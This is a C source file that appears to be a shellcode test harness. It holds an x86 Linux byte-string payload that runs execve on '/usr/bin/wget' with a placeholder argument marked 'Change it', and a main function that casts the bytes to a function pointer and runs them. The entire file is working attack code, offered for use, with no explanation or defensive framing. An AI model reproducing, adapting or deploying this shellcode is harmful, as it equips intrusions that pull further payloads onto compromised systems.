#include<stdio.h>
#include<string.h>

unsigned char payload[] = \
"\x6a\x0b\x58\x99\x52"
"\x68\x61\x61\x61\x61" // Change it
"\x89\xe1\x52\x6a\x74"
"\x68\x2f\x77\x67\x65"
"\x68\x2f\x62\x69\x6e"
"\x68\x2f\x75\x73\x72"
"\x89\xe3\x52\x51\x53"
"\x89\xe1\xcd\x80\x40"
"\xcd\x80";

int main()
{

	printf("Payload Length:  %d\n", strlen(payload));

	int (*ret)() = (int(*)())payload;

	ret();

}

	
